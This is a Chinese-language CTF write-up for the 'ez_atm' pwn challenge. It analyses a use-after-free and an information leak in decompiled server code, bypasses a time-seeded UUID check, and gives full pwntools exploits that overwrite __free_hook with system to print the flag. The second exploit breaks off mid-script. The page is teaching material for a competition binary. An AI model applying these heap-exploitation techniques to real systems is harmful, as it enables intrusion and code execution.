<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ez_atm: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>_amd64/ld<span class="number">-2.27</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=bd8945726574e2b623d0f972a2b9d04bb4fd9e3a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>本程序分为客户端和服务端，在客户端上有一个后门：（没什么用）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  info(<span class="string">&quot;here I  will give you a f1ag,you win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">  close(sockfd);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>cancellation</code> 函数中有一个 UAF：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( check_password(current_account, &amp;data[<span class="number">16</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(account_list[current_account]);      <span class="comment">// UAF</span></span><br><span class="line">    current_account = <span class="number">-1</span>;</span><br><span class="line">    toClient(<span class="number">1</span>, <span class="string">&quot;The target account has been cancelled.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">    toClient(<span class="number">2</span>, <span class="string">&quot;password error.Try again.&quot;</span>);</span><br><span class="line">  receviceline();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>stat_query</code> 函数中调用的 <code>toClient</code> 函数中有溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">toClient</span><span class="params">(<span class="keyword">int</span> num, _QWORD *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 str_tmp; <span class="comment">// rcx MAPDST</span></span><br><span class="line">  __int64 str_tmp2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;reply :         %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)str);</span><br><span class="line">  strline = num;</span><br><span class="line">  str_tmp = str[<span class="number">1</span>];</span><br><span class="line">  ret_data[<span class="number">0</span>] = *str;</span><br><span class="line">  ret_data[<span class="number">1</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">3</span>];</span><br><span class="line">  ret_data[<span class="number">2</span>] = str[<span class="number">2</span>];</span><br><span class="line">  ret_data[<span class="number">3</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">5</span>];</span><br><span class="line">  ret_data[<span class="number">4</span>] = str[<span class="number">4</span>];</span><br><span class="line">  ret_data[<span class="number">5</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">7</span>];</span><br><span class="line">  ret_data[<span class="number">6</span>] = str[<span class="number">6</span>];</span><br><span class="line">  ret_data[<span class="number">7</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">9</span>];</span><br><span class="line">  ret_data[<span class="number">8</span>] = str[<span class="number">8</span>];</span><br><span class="line">  ret_data[<span class="number">9</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">11</span>];</span><br><span class="line">  ret_data[<span class="number">10</span>] = str[<span class="number">10</span>];</span><br><span class="line">  ret_data[<span class="number">11</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">13</span>];</span><br><span class="line">  ret_data[<span class="number">12</span>] = str[<span class="number">12</span>];</span><br><span class="line">  ret_data[<span class="number">13</span>] = str_tmp;</span><br><span class="line">  str_tmp2 = str[<span class="number">15</span>];</span><br><span class="line">  ret_data[<span class="number">14</span>] = str[<span class="number">14</span>];</span><br><span class="line">  ret_data[<span class="number">15</span>] = str_tmp2;</span><br><span class="line">  send(fd, &amp;strline, <span class="number">0x84</span>uLL, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(&amp;strline, <span class="number">0</span>, <span class="number">0x84</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>本地可以用如下方式运行程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./client <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3339</span></span><br><span class="line">./ez_atm           </span><br></pre></td></tr></table></figure>
<p>比赛时我看了半天也不知道该如何泄露，因为 <code>client</code> 限制了程序的输入，导致程序的溢出利用不了（虽然客户端的 <code>stat_query</code> 有溢出，但是服务端的 <code>client</code> 接收不到）</p>
<p>赛后看别人 wp 才发现可以不通过 <code>client</code> 进行交互，从而摆脱了 <code>client</code> 的限制</p>
<p>先把本地的 docker 环境搭起来：（记得在 <code>bin</code> 目录中添加一个 <code>flag</code> 文件）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;ez_atm&quot;</span> .</span><br></pre></td></tr></table></figure>
<ul>
<li>启动容器：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:4444:8888&quot;</span> -p <span class="string">&quot;0.0.0.0:7777:3339&quot;</span> -h <span class="string">&quot;ez_atm&quot;</span> --name=<span class="string">&quot;ez_atm&quot;</span> ez_atm</span><br></pre></td></tr></table></figure>
<ul>
<li>然后执行 <code>docker exec -it</code> 连接目标 docker：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 87a8f7705e22 /bin/sh</span><br></pre></td></tr></table></figure>
<ul>
<li>后台运行程序：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ./ez_atm /</span><br><span class="line">/ez_atm &amp;</span><br></pre></td></tr></table></figure>
<ul>
<li>查看程序的 PID：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep &quot;ez_atm&quot;</span><br><span class="line">root      185272  0.0  0.0   4396   764 pts/0    S    02:58   0:00 ./ez_atm # 子进程</span><br><span class="line">root      185275  4.0  0.0      0     0 pts/0    Z    03:02   0:04 [ez_atm] &lt;defunct&gt;</span><br><span class="line">root      247050  0.0  0.0   4528    68 pts/0    S    03:02   0:00 ./ez_atm # 父进程</span><br><span class="line">root      247052  0.0  0.0  11472  1104 pts/0    S+   03:03   0:00 grep ez_atm</span><br></pre></td></tr></table></figure>
<ul>
<li>查看容器的 PID：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS                                            NAMES</span><br><span class="line">87a8f7705e22   ez_atm    &quot;/start.sh&quot;   26 minutes ago   Up 26 minutes   0.0.0.0:7777-&gt;3339/tcp, 0.0.0.0:4444-&gt;8888/tcp   ez_atm</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; 87a8f7705e22</span><br><span class="line">377387</span><br></pre></td></tr></table></figure>
<p>如果我们不使用 <code>client</code> 进行连接，就需要先绕过服务端的随机数检测：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">recv_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;</span>);</span><br><span class="line">  code(s);</span><br><span class="line">  send(fd, seed, <span class="number">4uLL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( recv(fd, data, <span class="number">0x1E</span>uLL, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error &quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s, data, <span class="number">0x1E</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    toClient(<span class="number">0</span>, <span class="string">&quot;1111&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  toClient(<span class="number">1</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>绕过该检测的脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    clibc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getrand</span>():</span></span><br><span class="line">        <span class="keyword">return</span> clibc.rand() % <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    ask_time = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    clibc.srand(ask_time)</span><br><span class="line">    uuid = <span class="built_in">list</span>(<span class="string">&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(uuid)):</span><br><span class="line">        <span class="keyword">if</span> uuid[i] != <span class="string">&#x27;4&#x27;</span> <span class="keyword">and</span> uuid[i] != <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> uuid[i] == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand())[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand() &amp; <span class="number">3</span> | <span class="number">8</span>)[<span class="number">2</span>:]</span><br><span class="line">    uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line">    p.send(uuid)</span><br></pre></td></tr></table></figure>
<p>另外我还看到一种解决办法，就是直接 path 客户端文件 <code>client</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">stat_query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  send_msg(<span class="string">&quot;stat_query&quot;</span>, <span class="number">10</span>);</span><br><span class="line">  recv_msg();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;msg_rec.msg_info[<span class="number">24</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffc9b86aa00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rsi <span class="number">0x7ffc9b86aa00</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7ffc9b86aa08</span> ◂— <span class="number">0xfd7bd20ea9bd5400</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7ffc9b86aa10</span> —▸ <span class="number">0x55959cc02130</span> ◂— push r15</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7ffc9b86aa18</span> —▸ <span class="number">0x7f4fc5e01c87</span> (__libc_start_main+<span class="number">231</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7ffc9b86aa20</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>获取到 <code>libc_base</code> 后，就直接把它写入 <code>fastbin</code> 中，然打 <code>fastbin attack</code> 就好了（最后执行 <code>system(cat flag &gt;&amp;4)</code>）</p>
<p>完整 exp：（不通过 <code>client</code> 进行交互）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg_send</span>(<span class="params">op, account_id=<span class="string">&quot;&quot;</span>, password=<span class="string">&quot;&quot;</span>, money=<span class="number">0</span></span>):</span></span><br><span class="line">    data = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: op,</span><br><span class="line">            <span class="number">0x10</span>: password,</span><br><span class="line">            <span class="number">0x18</span>: account_id,</span><br><span class="line">            <span class="number">0x38</span>: p32(money),</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    ).ljust(<span class="number">0x98</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    clibc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getrand</span>():</span></span><br><span class="line">        <span class="keyword">return</span> clibc.rand() % <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    ask_time = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">    clibc.srand(ask_time)</span><br><span class="line">    uuid = <span class="built_in">list</span>(<span class="string">&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(uuid)):</span><br><span class="line">        <span class="keyword">if</span> uuid[i] != <span class="string">&#x27;4&#x27;</span> <span class="keyword">and</span> uuid[i] != <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> uuid[i] == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand())[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand() &amp; <span class="number">3</span> | <span class="number">8</span>)[<span class="number">2</span>:]</span><br><span class="line">    uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line">    sh.send(uuid)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;139.9.242.36&#x27;, 4445)</span></span><br><span class="line">init()</span><br><span class="line">msg_send(<span class="string">&quot;stat_query&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x21c87</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook_addr = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x4f420</span></span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">sh.recvuntil(p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>))</span><br><span class="line">heap_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:\t&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, p64(heap_base + <span class="number">0x10</span>), p64(heap_base + <span class="number">0x6b0</span>))</span><br><span class="line">msg_send(<span class="string">&quot;update_pwd&quot;</span>, <span class="string">&quot;account1&quot;</span>, p64(free_hook_addr - <span class="number">0x18</span>))</span><br><span class="line">msg_send(<span class="string">&quot;update_pwd&quot;</span>, <span class="string">&quot;account1&quot;</span>, p64(heap_base + <span class="number">0x6b0</span>))</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;&gt;&amp;4\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(system_addr), <span class="string">&quot;cat flag&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>完整 exp：（直接修改 <code>client</code>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./client&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : 